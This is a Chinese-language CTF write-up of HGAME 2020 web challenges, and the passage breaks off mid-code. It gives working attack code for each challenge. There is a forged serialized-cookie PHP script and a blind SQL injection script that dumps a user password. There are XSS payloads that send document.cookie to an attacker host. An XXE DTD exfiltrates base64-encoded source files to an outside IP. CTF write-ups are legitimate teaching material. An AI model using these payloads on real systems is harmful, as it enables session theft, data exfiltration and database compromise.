+<p>在xss平台就能拿到cookie</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/d4f8ea33d3025228ce1511bc2319187a.png" alt=""></p>
+<p>从flag is here进去可以看到需要admin的token，于是换一下token访问就能拿到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/97ab604093fc3a04d3334a8a9380868f.png" alt=""></p>
+<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h2><p>这题做的觉得自己有些智障<br>直接看页面源码可以看到有源码<code>source.zip</code>，拿下来读一波，基本都是<code>cardinal.php</code>在处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public function Fight($monster)&#123;</span><br><span class="line">       if($monster[&apos;no&apos;] &gt;= $this-&gt;rank)&#123;</span><br><span class="line">           $this-&gt;rank -= rand(5, 15);</span><br><span class="line">           if($this-&gt;rank &lt;= 2)&#123;</span><br><span class="line">               $this-&gt;rank = 2;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $_SESSION[&apos;exp&apos;] += rand(20, 200);</span><br><span class="line">           return array(</span><br><span class="line">               &apos;result&apos; =&gt; true, </span><br><span class="line">               &apos;msg&apos; =&gt; &apos;&lt;span style=&quot;color:green;&quot;&gt;Congratulations! You win! &lt;/span&gt;&apos;</span><br><span class="line">           );</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           return array(</span><br><span class="line">               &apos;result&apos; =&gt; false, </span><br><span class="line">               &apos;msg&apos; =&gt; &apos;&lt;span style=&quot;color:red;&quot;&gt;You die!&lt;/span&gt;&apos;</span><br><span class="line">           );</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>一开始看到这里还以为要写脚本去爆破，直到有一次正好减到1，不过写完脚本一跑发现自己看漏了一堆验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private function init($data)&#123;</span><br><span class="line">       foreach($data as $key =&gt; $value)&#123;</span><br><span class="line">           $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);</span><br><span class="line">           $this-&gt;sign .= md5($this-&gt;sign . $value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private function Save()&#123;</span><br><span class="line">       $sign = md5(serialize($this-&gt;monsterData) . $this-&gt;encryptKey);</span><br><span class="line">       setcookie(&apos;monster&apos;, base64_encode(serialize($this-&gt;monsterData) . $sign));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>Game类和Monster类生成sign的过程中进行了多次的md5加密，想要哈希扩展是不可能了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()&#123;</span><br><span class="line">       // 确保程序是跑在服务器上的！</span><br><span class="line">       $this-&gt;serverKey = $_SERVER[&apos;key&apos;];</span><br><span class="line">       if($this-&gt;key === $this-&gt;serverKey)&#123;</span><br><span class="line">           $_SESSION[&apos;rank&apos;] = $this-&gt;rank;</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           // 非正常访问</span><br><span class="line">           session_start();</span><br><span class="line">           session_destroy();</span><br><span class="line">           setcookie(&apos;monster&apos;, &apos;&apos;);</span><br><span class="line">           header(&apos;Location: index.php&apos;);</span><br><span class="line">           exit;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>然后再读一波，发现rank中<code>__destruct()</code>是可以直接修改rank的值的？！这里要验证key和serverKey，引用一下就能绕过。估计这是道反序列化题</p>
+<p>然后找找能够反序列化的地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$monsterData = base64_decode($_COOKIE[&apos;monster&apos;]);</span><br><span class="line">      if(strlen($monsterData) &gt; 32)&#123;</span><br><span class="line">          $sign = substr($monsterData, -32);</span><br><span class="line">          $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);</span><br><span class="line">          if(md5($monsterData . $this-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">              $this-&gt;monsterData = unserialize($monsterData);</span><br></pre></td></tr></table></figure>
+<p>发现Monster类中<code>__construct()</code>使用了反序列化，不过这样问题又回到了一开始。这个加密要怎么搞</p>
+<p>又看了一圈源码发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach($data as $key =&gt; $value)&#123;</span><br><span class="line">          $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);</span><br><span class="line">          $this-&gt;sign .= md5($this-&gt;sign . $value);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p><code>public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;</code></p>
+<p>这个循环中用了<code>sprintf()</code>将data中的值赋给了<code>$welcomeMsg</code></p>
+<p><code>$data = [$playerName, $this-&gt;encryptKey];</code></p>
+<p>而data中有encryptKey，那只要我们将可控的playerName设为<code>%s</code>就能输出encryptKey了</p>
+<p>于是操作一波获得key</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/8d89c9dc9b0325f252795f486f391360.png" alt=""></p>
+<p>然后反序列化一波</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Rank&#123;</span><br><span class="line">	private $rank;</span><br><span class="line">    private $serverKey; </span><br><span class="line">    private $key;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;rank = 1;</span><br><span class="line">        $this-&gt;key = &amp;$this-&gt;serverKey;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rank = new Rank();</span><br><span class="line">$s = serialize($rank);</span><br><span class="line"></span><br><span class="line">$sign = &apos;&apos;;</span><br><span class="line">$data = [&apos;k0t0r1&apos;, &apos;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&apos;];</span><br><span class="line">foreach($data as $key =&gt; $value)&#123;</span><br><span class="line">	$sign .= md5($sign . $value);</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode($s.md5($s.$sign));</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/ab4c5626e96267afac42b57f8d2da45d.png" alt=""></p>
+<p>不考虑通关送个亚斯娜？x</p>
+<h2 id="二发入魂！"><a href="#二发入魂！" class="headerlink" title="二发入魂！"></a>二发入魂！</h2><p>这题脑洞太大<br>一开始进去渗透了几圈没找到什么，看源码提示了一个php5</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/afac374fcedbe2a13c310068e93486d9.png" alt=""></p>
+<p>应该是和php5有关的漏洞</p>
+<p>然后尝试了一下功能，发现上限是777个，于是尝试全部加起来发送，依旧不行<br>后面去查了一下cdkey的生成，发现什么椭圆算法啥的，感觉也不太像</p>
+<p>懵逼了很久后，没事连续生成了几下，发现短时间内点击生成的数字相同，于是用脚本检验一下生成不同个数时是不是还是一样，发现依旧一样。联系php5和随机数，就想到了<code>mt_rand()</code>这个函数。之前也写过，<code>mt_rand()</code>在php5和php7是有些不太一样的。于是猜cdkey是随机数的种子，但两秒就要是不是有点快了？？？在我沉思的时候出题人放了一张妙蛙种子的图上去，基本确定了就是爆种子了</p>
+<p>于是上一波脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*- </span><br><span class="line">import requests</span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">cookies = &#123;&apos;PHPSESSID&apos;:&apos;obbqlucblk6raskk3jkapojgr0&apos;&#125;</span><br><span class="line">for i in range(1000):</span><br><span class="line">	url = &quot;https://twoshot.hgame.n3ko.co/random.php?times=1&quot;</span><br><span class="line">        c = requests.get(url,cookies=cookies,verify=False)</span><br><span class="line">	cdkey = c.text[1:-1]</span><br><span class="line">	print cdkey</span><br><span class="line"></span><br><span class="line">	php_mt_seed = subprocess.Popen(&quot;exec ./php_mt_seed &quot;+cdkey,shell = True,stdout = subprocess.PIPE)</span><br><span class="line">	seed = None</span><br><span class="line">	while True:</span><br><span class="line">		out = php_mt_seed.stdout.readline()</span><br><span class="line">		if out == &apos;&apos; and php_mt_seed.poll() != None:</span><br><span class="line">			break</span><br><span class="line">		if out != &apos;&apos;:</span><br><span class="line">	                print out</span><br><span class="line">			match = re.search(&quot;seed\ =\ [0-9a-z]&#123;1,11&#125;\ =\ ([0-9]&#123;1,11&#125;)&quot;,out)</span><br><span class="line">	                if match:</span><br><span class="line">				seed = match.group(1)</span><br><span class="line">	                        php_mt_seed.kill()</span><br><span class="line">	                        break</span><br><span class="line">	print seed</span><br><span class="line"></span><br><span class="line">	url = &quot;https://twoshot.hgame.n3ko.co/verify.php&quot;</span><br><span class="line">	data = &#123;&apos;ans&apos;:seed&#125;</span><br><span class="line">        headers = &#123;&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;</span><br><span class="line">	c = requests.post(url,headers=headers,cookies=cookies,data=data,verify=False)</span><br><span class="line">	if &quot;wrong answer or too slow&quot; not in c.text:</span><br><span class="line">		print c.text</span><br><span class="line">		print c.text</span><br><span class="line">		break</span><br><span class="line">	print c.text</span><br><span class="line">	time.sleep(1)</span><br></pre></td></tr></table></figure>
+<p>这里为了达到2s的要求，修改了一下php_mt_seed</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">static uint64_t crack(const match_t *match)</span><br><span class="line">&#123;</span><br><span class="line">	uint64_t found = 0, recent = 0;</span><br><span class="line">	uint32_t base, top;</span><br><span class="line">#if defined(__MIC__) || defined(__AVX512F__)</span><br><span class="line">	const uint32_t step = 0x10000000 &gt;&gt; P;</span><br><span class="line">#else</span><br><span class="line">	const uint32_t step = 0x2000000 &gt;&gt; P;</span><br><span class="line">#endif</span><br><span class="line">	version_t flavor;</span><br><span class="line">	long clk_tck;</span><br><span class="line">	clock_t start_time;</span><br><span class="line">	struct tms tms;</span><br><span class="line"></span><br><span class="line">	flavor = PHP_521;</span><br><span class="line">	do &#123;</span><br><span class="line">		unsigned int shift = (flavor == PHP_521);</span><br></pre></td></tr></table></figure>
+<p>crack函数中将flavor的值设为<code>PHP_521</code>，让程序不跑php5.2以下版本的种子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">for (base = 0; base &lt; top; base += step) &#123;</span><br><span class="line">	uint32_t start = base &lt;&lt; (P + shift);</span><br><span class="line">	uint32_t next = (base + step) &lt;&lt; (P + shift);</span><br><span class="line">	clock_t running_time = times(&amp;tms) - start_time;</span><br><span class="line">	fprintf(stderr,</span><br><span class="line">	    &quot;\rFound %llu, trying 0x%08x - 0x%08x, &quot;</span><br><span class="line">	    &quot;speed %.1f Mseeds/s &quot;,</span><br><span class="line">	    (unsigned long long)found, start, next - 1,</span><br><span class="line">	    (double)start * clk_tck /</span><br><span class="line">	    (running_time ? running_time * 1e6 : 1e6));</span><br><span class="line">	if ( (unsigned long long)found &gt; 0)</span><br><span class="line">		break;</span><br><span class="line">	recent = crack_range(base, base + step, match, flavor);</span><br><span class="line">	found += recent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同样在crack函数中，写了一个if让跑出一个数就直接中止</p>
+<p>然后找了一台服务器，开虚拟机12核跑，一分钟内就爆到了【一开始写脚本的时候忘带了cookie，整了一天血亏</p>
+<p>后面根据群里大佬的提示，找到了应该是这题的预期解<br><a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">Breaking PHP’s mt_rand() with 2 values and no bruteforce</a><br>抱歉12核真的可以为所欲为，直接代替算法，晚点补补这个算法</p>
+<h2 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h2><p>这题进去测了好久，找源码泄漏，扫目录什么的都试了一下没有什么收获<br>抓包返回json觉得有可能有XXE然而并不行，想着注入也被正则限制死了，感觉就只有利用这个购买与出售</p>
+<p>没啥思路去问了一下做出的师傅，师傅说是条件竞争，条件竞争就是利用服务器处理不来高并发，再未响应前多次实现一个请求<br>到这题就是不停购买/出售，让服务器以为我们还有钱/物品，达到“赚钱”的目的</p>
+<p>于是上burpsuit，intruder下设置null payload，开30线程跑</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/762339abdec150f4f984ab73b4cc4d3c.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/e9012ca6070807d4234f6fbd98d449db.png" alt=""></p>
+<p>这里主要要先跑solve后跑buy，并在solve结束前结束buy。其它线程数，爆破数可以自行调整。钱越多后可以买更多加快涨钱的速度</p>
+<p>跑完回去卖到1亿拿flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/7448224933977fa08a3021c03aac89ee.png" alt=""></p>
+<h2 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h2><p>这题登进去后本来以为是insert注入，但发现都被转义了无法注<br>于是尝试了一下其它几个点，发现delete处可以进行报错盲注。错误时删除失败，成功时删除成功。由于二分要增删多次很麻烦于是直接一波跑</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-  </span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">s_url = r&apos;http://139.199.182.61:19999/index.php?method=send&apos;</span><br><span class="line">d_url = r&apos;http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=&apos;</span><br><span class="line"></span><br><span class="line">did = 297 #先发布一个再修改这里后跑</span><br><span class="line">cookie = &#123;&apos;PHPSESSID&apos;:&apos;ehk1o93am9ihj6bot8d1u31jcd&apos;&#125;</span><br><span class="line">data = &#123;&apos;message&apos;:&apos;sadas&apos;&#125;</span><br><span class="line"></span><br><span class="line">for i in range(1,100):</span><br><span class="line">	# payload = &quot; or (select(length(database())&gt;&quot;+str(i)+&quot;))*999*pow(999,102)&quot;</span><br><span class="line">	# payload = &quot; or (select((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())&gt;&quot;+str(i)+&quot;))*999*pow(999,102)&quot;</span><br><span class="line">	# payload = &quot; or (select((select length(group_concat(column_name)) from information_schema.columns where table_name=&apos;user&apos;)&gt;&quot;+str(i)+&quot;))*999*pow(999,102)&quot;</span><br><span class="line">	# payload = &quot; or (select((select length(name) from user limit 1)&gt;&quot;+str(i)+&quot;))*999*pow(999,102)&quot;</span><br><span class="line">	payload = &quot; or (select((select length(password) from user limit 1)&gt;&quot;+str(i)+&quot;))*999*pow(999,102)&quot;</span><br><span class="line">	print payload</span><br><span class="line">	http = requests.get(d_url+str(did)+payload,cookies=cookie)</span><br><span class="line">	if &quot;delete_id=&quot;+str(did) not in http.text:</span><br><span class="line">		print i</span><br><span class="line">		break</span><br><span class="line"></span><br><span class="line">l = i</span><br><span class="line"></span><br><span class="line">res = &apos;&apos;</span><br><span class="line">for i in range(l):</span><br><span class="line">	time.sleep(1)</span><br><span class="line">	requests.post(s_url,data=data,cookies=cookie)</span><br><span class="line">	did = did + 1</span><br><span class="line">	for j in range(33,128):</span><br><span class="line">		# payload = &quot; or (select((ascii(substr(database(),&quot;+str(i+1)+&quot;,1))&gt;&quot;+str(j)+&quot;)))*999*pow(999,102)&quot;</span><br><span class="line">		# payload = &quot; or (select(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(i+1)+&quot;,1))&gt;&quot;+str(j)+&quot;))*999*pow(999,102)&quot;</span><br><span class="line">		# payload = &quot; or (select(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;user&apos;),&quot;+str(i+1)+&quot;,1))&gt;&quot;+str(j)+&quot;))*999*pow(999,102)&quot;</span><br><span class="line">		# payload = &quot; or (select(ascii(substr((select name from user limit 1),&quot;+str(i+1)+&quot;,1))&gt;&quot;+str(j)+&quot;))*999*pow(999,102)&quot;</span><br><span class="line">		payload = &quot; or (select(ascii(substr((select password from user limit 1),&quot;+str(i+1)+&quot;,1))&gt;&quot;+str(j)+&quot;))*999*pow(999,102)&quot;</span><br><span class="line">		print payload</span><br><span class="line">		http = requests.get(d_url+str(did)+payload,cookies=cookie)</span><br><span class="line">		if &quot;delete_id=&quot;+str(did) not in http.text:</span><br><span class="line">			res = res + chr(j)</span><br><span class="line">			print res</span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line"># babysql</span><br><span class="line"># !essages,user</span><br><span class="line"># id,name,password</span><br><span class="line"># cosmos</span><br><span class="line"># f1FXOCnj26Fkadzt4Sqynf6O7CgR</span><br></pre></td></tr></table></figure>
+<p>这里判断成功失败由于是中文有点难处理，就直接看留言是否被删来判断，用pow()来跑报错</p>
+<p>然后登录进去得到flag</p>
+<h2 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h2><p>这题一看题目描述限制策略就觉得应该有CSP<br>于是进去抓个包，果然有CSP限制</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/5541adde729da1c0627954e6bff21be4.png" alt=""></p>
+<p><code>default-src &#39;self&#39;; script-src &#39;self&#39;</code>限制了只能读取该域名下的文件，内联之类的都不允许</p>
+<p>而这题有提示了bot访问localhost下的文件，猜测需要利用到站里的其它页面。试了几下后发现，send页面message传参后直接返回，也就是这里能利用来进行反射型XSS，由于scrtipt还是被过滤了，于是用svg</p>
+<p>于是构造一波跳转<br><code>&lt;iframe src=&quot;http://c-chat-v2.hgame.babelfish.ink/send?message=&lt;svg onload=document.location=&#39;http://ip/?&#39;+document.cookie&gt;&quot;&gt;&lt;/iframe&gt;</code><br>发现依旧被限制，于是改用发送请求</p>
+<p>尝试一下<br><code>http://c-chat-v2.hgame.babelfish.ink/send?message=&lt;svg onload=&quot;t=new XMLHttpRequest;t.open(&#39;GET&#39;, &#39;http://ip/?&#39;%2bdocument.cookie,!0),t.send(&#39;flag&#39;);&quot;&gt;</code><br>发现这样传过去<code>XMLHttpRequest</code>会被解析为小写导致无法得到XMLHttpRequest类</p>
+<p>于是用html实体编码，又由于url上带html实体编码有问题，于是再url编码一下。这次能够通过但得到的字符串字符数大于1000，于是减少一点编码的字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://c-chat-v2.hgame.babelfish.ink/send?message=&lt;svg onload=%26%23%78%37%37%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%37%37%3b%26%23%78%32%65%3b%26%23%78%37%34%3b%26%23%78%33%64%3b%26%23%78%36%65%3b%26%23%78%36%35%3b%26%23%78%37%37%3b%26%23%78%32%30%3b%26%23%78%35%38%3b%26%23%78%34%64%3b%26%23%78%34%63%3b%26%23%78%34%38%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%37%30%3b%26%23%78%35%32%3b%26%23%78%36%35%3b%26%23%78%37%31%3b%26%23%78%37%35%3b%26%23%78%36%35%3b%26%23%78%37%33%3b%26%23%78%37%34%3b;window.t.open(`GET`,`http://ip/?`%2bdocument.cookie,!0),window.t.send(`flag`);&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>到这里已经可以将token弹回来了</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/97af4a557b699c003eaf4c97b5d2fdc2.png" alt=""></p>
+<p>然后发给bot，什么都没弹回来，人傻了</p>
+<p>搞了很久找不出问题于是换个方法做，查了一下发现meta这个东西真的好用。直接跳到send页面，逃出限制后就可以接着跳转到自己的ip下了<br>于是构造一波<br><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://c-chat-v2.hgame.babelfish.ink/send?message=&lt;svg onload=%22document.location=&#39;http://ip/?&#39;%2bdocument.cookie%22&gt;&quot;&gt;</code><br>测试一下成功打回自己的cookie，然后试了一下发现bot打得回来但没有cookie？？？</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/bbfa9497de4bb37df8fd601c66b3ff6b.png" alt=""></p>
+<p>这题不是打cookie吗？于是尝试去直接打<code>/flag</code>的源码也没打成，一脸懵逼。于是去找了出题人，出题人整了一下才发现bot有点问题，localhost访问过去不带cookie，说直接<code>/send</code>访问就好，于是改一下</p>
+<p><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=/send?message=&lt;svg onload=%22document.location=&#39;http://ip/?&#39;%2bdocument.cookie%22&gt;&quot;&gt;</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/407a6a5dc022b1374171f0f0999da9b8.png" alt=""></p>
+<p>拿到token，修改访问得到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/e9ab09aa24bbacf3b299033df3f5168d.png" alt=""></p>
+<p>不过讲道理我打<code>/flag</code>也没有带localhost，为啥打不到？</p>
+<h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h2><p>让出题人代打代打出题人服务中心的出题人【禁止套娃</p>
+<p>抓个包发现是xml，应该要XXE</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/5d27fa3e0c273baa8e84c02b8d4194d7.png" alt=""></p>
+<p>不过读文件无回显，于是外带一波<br>在服务器上准备好<code>test.dtd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/recource=submit.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://119.23.206.8:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>然后将payload插在头部发送</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://119.23.206.8/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/80074bfb15c8d886ab6be36b745fdfc3.png" alt=""></p>
+<p>成功弹回源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/cbc47b33e183b3fdd3c02b2d078ac082.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">$result = null;</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);</span><br><span class="line">    $stmt-&gt;bindParam(&apos;:id&apos;, $id);</span><br><span class="line">    $stmt-&gt;bindParam(&apos;:chal_name&apos;, $chal_name);</span><br><span class="line">    $stmt-&gt;bindParam(&apos;:bd_level&apos;, $level);</span><br><span class="line">    $stmt-&gt;bindParam(&apos;:bd_time&apos;, $level);</span><br><span class="line"></span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    $id = $creds-&gt;id;</span><br><span class="line">    $chal_name = $creds-&gt;name;</span><br><span class="line">    $level = $creds-&gt;level;</span><br><span class="line">    $time = $creds-&gt;time;</span><br><span 